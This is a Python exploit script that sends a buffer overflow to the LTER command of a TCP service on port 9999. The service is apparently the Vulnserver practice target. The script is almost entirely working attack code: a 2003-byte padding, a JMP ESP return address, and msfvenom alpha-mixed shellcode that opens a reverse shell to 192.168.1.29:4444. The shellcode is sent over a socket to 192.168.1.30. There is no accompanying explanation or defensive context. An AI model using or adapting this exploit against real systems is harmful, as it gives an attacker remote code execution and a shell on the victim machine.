#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 62501203 (Only contains ascii characters.)

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.29 LPORT=4444 -f c -e x86/alpha_mixed -b '\x00' BufferRegister=ESP
shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4a\x48\x4e\x62\x35\x50"
"\x37\x70\x73\x30\x31\x70\x4d\x59\x59\x75\x54\x71\x59\x50\x61"
"\x74\x6c\x4b\x30\x50\x46\x50\x6e\x6b\x33\x62\x54\x4c\x4e\x6b"
"\x30\x52\x45\x44\x6c\x4b\x33\x42\x75\x78\x46\x6f\x78\x37\x63"
"\x7a\x64\x66\x70\x31\x6b\x4f\x4e\x4c\x57\x4c\x61\x71\x33\x4c"
"\x76\x62\x56\x4c\x47\x50\x6f\x31\x6a\x6f\x56\x6d\x66\x61\x69"
"\x57\x78\x62\x7a\x52\x70\x52\x52\x77\x4e\x6b\x50\x52\x52\x30"
"\x4c\x4b\x63\x7a\x57\x4c\x4c\x4b\x32\x6c\x74\x51\x33\x48\x48"
"\x63\x33\x78\x55\x51\x4a\x71\x33\x61\x6e\x6b\x61\x49\x65\x70"
"\x37\x71\x79\x43\x6e\x6b\x61\x59\x62\x38\x68\x63\x67\x4a\x33"
"\x79\x6e\x6b\x76\x54\x4e\x6b\x45\x51\x4a\x76\x56\x51\x59\x6f"
"\x4e\x4c\x4b\x71\x78\x4f\x64\x4d\x36\x61\x4a\x67\x66\x58\x39"
"\x70\x71\x65\x6b\x46\x63\x33\x61\x6d\x78\x78\x65\x6b\x53\x4d"
"\x34\x64\x63\x45\x7a\x44\x63\x68\x4e\x6b\x42\x78\x47\x54\x55"
"\x51\x59\x43\x62\x46\x4e\x6b\x64\x4c\x42\x6b\x6c\x4b\x52\x78"
"\x55\x4c\x37\x71\x4a\x73\x6c\x4b\x67\x74\x4c\x4b\x76\x61\x4a"
"\x70\x4b\x39\x37\x34\x74\x64\x35\x74\x63\x6b\x73\x6b\x45\x31"
"\x73\x69\x73\x6a\x32\x71\x4b\x4f\x6d\x30\x33\x6f\x73\x6f\x43"
"\x6a\x4c\x4b\x77\x62\x38\x6b\x6e\x6d\x51\x4d\x32\x48\x54\x73"
"\x50\x32\x47\x70\x65\x50\x52\x48\x42\x57\x64\x33\x77\x42\x53"
"\x6f\x76\x34\x72\x48\x70\x4c\x72\x57\x64\x66\x64\x47\x59\x6f"
"\x4b\x65\x48\x38\x4e\x70\x56\x61\x63\x30\x65\x50\x66\x49\x39"
"\x54\x71\x44\x76\x30\x32\x48\x45\x79\x6d\x50\x32\x4b\x63\x30"
"\x79\x6f\x39\x45\x46\x30\x70\x50\x36\x30\x72\x70\x77\x30\x66"
"\x30\x73\x70\x36\x30\x75\x38\x78\x6a\x34\x4f\x49\x4f\x4d\x30"
"\x79\x6f\x49\x45\x4f\x67\x31\x7a\x46\x65\x72\x48\x69\x50\x39"
"\x38\x53\x31\x77\x6d\x72\x48\x34\x42\x43\x30\x54\x51\x71\x4c"
"\x4f\x79\x78\x66\x31\x7a\x76\x70\x56\x36\x63\x67\x70\x68\x6c"
"\x59\x59\x35\x63\x44\x45\x31\x4b\x4f\x58\x55\x4f\x75\x79\x50"
"\x52\x54\x54\x4c\x6b\x4f\x30\x4e\x37\x78\x30\x75\x58\x6c\x71"
"\x78\x4c\x30\x4f\x45\x49\x32\x71\x46\x69\x6f\x6a\x75\x31\x78"
"\x75\x33\x42\x4d\x51\x74\x77\x70\x4c\x49\x79\x73\x42\x77\x61"
"\x47\x73\x67\x70\x31\x78\x76\x53\x5a\x54\x52\x32\x79\x36\x36"
"\x68\x62\x4b\x4d\x62\x46\x78\x47\x73\x74\x67\x54\x77\x4c\x35"
"\x51\x53\x31\x6e\x6d\x77\x34\x37\x54\x36\x70\x79\x56\x47\x70"
"\x43\x74\x46\x34\x52\x70\x36\x36\x70\x56\x53\x66\x30\x46\x66"
"\x36\x52\x6e\x46\x36\x43\x66\x53\x63\x70\x56\x50\x68\x31\x69"
"\x4a\x6c\x35\x6f\x4d\x56\x4b\x4f\x6e\x35\x6b\x39\x4d\x30\x62"
"\x6e\x51\x46\x51\x56\x59\x6f\x44\x70\x65\x38\x67\x78\x4d\x57"
"\x57\x6d\x31\x70\x6b\x4f\x68\x55\x6d\x6b\x7a\x50\x6c\x75\x69"
"\x32\x63\x66\x62\x48\x4d\x76\x6c\x55\x6d\x6d\x4f\x6d\x69\x6f"
"\x79\x45\x77\x4c\x74\x46\x51\x6c\x55\x5a\x4b\x30\x59\x6b\x6d"
"\x30\x43\x45\x57\x75\x6d\x6b\x70\x47\x54\x53\x52\x52\x50\x6f"
"\x33\x5a\x73\x30\x33\x63\x79\x6f\x79\x45\x41\x41")

payload = ''
payload += 'A' * 2003
payload += '\x03\x12\x50\x62'
payload += shellcode
payload += 'C' * (3000 - len(payload))


# Send the 1st stage payload to the LTER command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('LTER /.:/' + payload + '\r\n')
connect.recv(1024)
connect.close()